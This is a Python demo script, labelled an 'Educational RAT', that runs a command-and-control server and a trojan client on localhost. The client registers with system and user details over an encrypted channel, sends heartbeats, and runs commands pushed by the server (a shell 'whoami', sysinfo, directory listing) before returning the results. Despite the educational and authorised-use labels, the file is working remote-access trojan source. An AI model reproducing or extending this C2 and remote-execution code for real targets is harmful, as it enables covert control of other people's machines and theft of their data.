"""
============================================================================
 教育用途 - 一键演示脚本
 Educational RAT - Live Demo Script

 在一个终端中启动服务端和客户端，演示完整的 C2 通信流程：
   1. 服务端启动监听
   2. 客户端连接注册
   3. 心跳保活
   4. 命令下发与执行
   5. 结果回传
============================================================================
"""

import os
import sys
import json
import time
import socket
import signal
import threading
import subprocess

# 将父目录加入路径
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from crypto_utils import (
    SymmetricCrypto, SecureChannel, MessageType, MessagePacket
)
from config import config

# 配置
HOST = "127.0.0.1"
PORT = 9443  # 使用不同端口避免冲突
KEY = config.crypto.derived_key

# 控制变量
server_running = True
demo_done = threading.Event()


def start_server():
    """在后台线程启动简单 C2 服务端"""
    import asyncio

    async def _run():
        crypto = SymmetricCrypto(KEY)
        server = await asyncio.start_server(
            lambda r, w: handle_client(crypto, r, w),
            HOST, PORT
        )
        print(f"[SERVER] Listening on {HOST}:{PORT}")
        async with server:
            await server.serve_forever()

    async def handle_client(crypto, reader, writer):
        addr = writer.get_extra_info('peername')
        print(f"[SERVER] 新连接: {addr[0]}:{addr[1]}")

        channel = SecureChannel(crypto)

        # 1. 等待注册
        try:
            data = await reader.read(4096)
            packet = channel.unpack_message(data)
            if packet and packet.msg_type == MessageType.REGISTER:
                sysinfo = json.loads(packet.payload.decode())
                client_id = sysinfo.get("client_id", "unknown")
                hostname = sysinfo.get("hostname", "?")
                print(f"[SERVER] 客户端已注册: {client_id} ({hostname})")

                # 发送 ACK
                ack = channel.pack_message(MessageType.ACK, b"REGISTER_OK")
                writer.write(ack)
                await writer.drain()

                # 2. 等待3秒后发送命令
                await asyncio.sleep(3)

                print(f"\n{'='*60}")
                print(f"  ▸ 下发命令: whoami")
                print(f"{'='*60}")
                cmd = channel.pack_message(
                    MessageType.COMMAND,
                    json.dumps({
                        "command_id": "demo-001",
                        "name": "shell",
                        "args": {"command": "whoami"}
                    }).encode()
                )
                writer.write(cmd)
                await writer.drain()

                # 3. 等待结果
                data = await asyncio.wait_for(reader.read(4096), timeout=10)
                packet = channel.unpack_message(data)
                if packet and packet.msg_type == MessageType.RESPONSE:
                    result = json.loads(packet.payload.decode())
                    print(f"[SERVER] 收到结果 (id={result['command_id']}):")
                    print(f"  成功: {result.get('success')}")
                    print(f"  输出: {result.get('output', '').strip()}")

                # 4. 下发第二个命令: sysinfo
                await asyncio.sleep(2)
                print(f"\n{'='*60}")
                print(f"  ▸ 下发命令: sysinfo")
                print(f"{'='*60}")
                cmd = channel.pack_message(
                    MessageType.COMMAND,
                    json.dumps({
                        "command_id": "demo-002",
                        "name": "sysinfo",
                        "args": {}
                    }).encode()
                )
                writer.write(cmd)
                await writer.drain()

                # 等待结果
                data = await asyncio.wait_for(reader.read(8192), timeout=10)
                packet = channel.unpack_message(data)
                if packet and packet.msg_type == MessageType.RESPONSE:
                    result = json.loads(packet.payload.decode())
                    print(f"[SERVER] 收到系统信息:")
                    info = json.loads(result.get('output', '{}'))
                    for k, v in info.items():
                        print(f"  {k}: {v}")

                # 5. 下发第三个命令: ls
                await asyncio.sleep(2)
                print(f"\n{'='*60}")
                print(f"  ▸ 下发命令: ls /tmp")
                print(f"{'='*60}")
                cmd = channel.pack_message(
                    MessageType.COMMAND,
                    json.dumps({
                        "command_id": "demo-003",
                        "name": "ls",
                        "args": {"path": "/tmp"}
                    }).encode()
                )
                writer.write(cmd)
                await writer.drain()

                # 等待结果
                data = await asyncio.wait_for(reader.read(4096), timeout=10)
                packet = channel.unpack_message(data)
                if packet and packet.msg_type == MessageType.RESPONSE:
                    result = json.loads(packet.payload.decode())
                    print(f"[SERVER] 目录列表 (截取前300字符):")
                    output = result.get('output', '')
                    print(f"  {output[:300]}")

                # 演示完成
                print(f"\n{'='*60}")
                print(f"  ▸ 演示完成！")
                print(f"{'='*60}")
                demo_done.set()

                # 等待心跳（演示连接保活）
                try:
                    while True:
                        data = await asyncio.wait_for(reader.read(4096), timeout=15)
                        packet = channel.unpack_message(data)
                        if packet and packet.msg_type == MessageType.HEARTBEAT:
                            print(f"[SERVER] 收到心跳 ♡")
                            ack = channel.pack_message(MessageType.ACK, b"PONG")
                            writer.write(ack)
                            await writer.drain()
                except asyncio.TimeoutError:
                    pass

        except Exception as e:
            print(f"[SERVER] 错误: {e}")

        writer.close()
        await writer.wait_closed()

    asyncio.run(_run())


def start_client():
    """启动客户端"""
    time.sleep(1)  # 等待服务端就绪

    from commands import CommandDispatcher, CommandResult

    print(f"[CLIENT] 客户端启动中...")
    print(f"[CLIENT] 目标: {HOST}:{PORT}")

    crypto = SymmetricCrypto(KEY)
    channel = SecureChannel(crypto)
    dispatcher = CommandDispatcher()

    # 连接
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)

    for attempt in range(5):
        try:
            sock.connect((HOST, PORT))
            print(f"[CLIENT] TCP 连接成功")
            break
        except ConnectionRefusedError:
            if attempt < 4:
                print(f"[CLIENT] 等待服务端就绪... ({attempt+1}/5)")
                time.sleep(1)
            else:
                print("[CLIENT] 连接失败！")
                return

    # 注册
    sysinfo_data = {
        "client_id": f"demo-agent-{os.getpid()}",
        "hostname": socket.gethostname(),
        "os": sys.platform,
        "username": os.environ.get("USER", "?"),
        "is_admin": (os.geteuid() == 0 if sys.platform != "win32" else False),
    }

    reg_msg = channel.pack_message(
        MessageType.REGISTER,
        json.dumps(sysinfo_data).encode()
    )
    sock.sendall(reg_msg)
    print(f"[CLIENT] 已发送注册信息")

    # 等待 ACK
    data = sock.recv(4096)
    packet = channel.unpack_message(data)
    if packet and packet.msg_type == MessageType.ACK:
        print(f"[CLIENT] 注册确认: {packet.payload.decode()}")

    # 主循环
    last_hb = 0
    while not demo_done.is_set():
        try:
            # 心跳
            if time.time() - last_hb > 5:
                hb_msg = channel.pack_message(MessageType.HEARTBEAT, b"")
                sock.sendall(hb_msg)
                last_hb = time.time()

            # 接收命令
            sock.settimeout(1)
            data = sock.recv(8192)
            if not data:
                break

            packet = channel.unpack_message(data)
            if packet is None:
                continue

            if packet.msg_type == MessageType.ACK:
                continue  # 心跳 PONG

            if packet.msg_type == MessageType.COMMAND:
                cmd_data = json.loads(packet.payload.decode())
                cmd_id = cmd_data.get("command_id", "?")
                cmd_name = cmd_data.get("name", "")
                cmd_args = cmd_data.get("args", {})

                print(f"[CLIENT] 执行命令: {cmd_name} (id={cmd_id})")

                # 执行
                result: CommandResult = dispatcher.execute(cmd_id, cmd_name, cmd_args)

                # 返回结果
                resp_msg = channel.pack_message(
                    MessageType.RESPONSE,
                    result.to_json()
                )
                sock.sendall(resp_msg)
                print(f"[CLIENT] 结果已返回: {'OK' if result.success else 'FAIL'} "
                      f"({result.duration_ms:.0f}ms)")

        except socket.timeout:
            continue
        except Exception as e:
            print(f"[CLIENT] 错误: {e}")
            break

    sock.close()
    print(f"[CLIENT] 客户端已断开")


def main():
    """主函数 —— 并行运行服务端和客户端"""
    print("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   教育用途远程管理框架 - 实时演示                                ║
║   Educational RAT - Live Demo                                    ║
║                                                                  ║
║   将在本地演示完整的 C2 通信流程：                               ║
║     1. 服务端启动监听 (127.0.0.1:9443)                           ║
║     2. 客户端连接 + 注册                                         ║
║     3. 心跳保活                                                  ║
║     4. 命令下发 (whoami, sysinfo, ls)                            ║
║     5. 结果回传                                                  ║
║                                                                  ║
║   ⚠ 仅限本地授权环境演示                                        ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
""")

    # 启动服务端线程
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()

    # 启动客户端
    start_client()

    # 等待演示完成
    demo_done.wait(timeout=30)

    print("\n[*] 演示结束！项目文件位置: /root/edu_rat/")


if __name__ == "__main__":
    main()
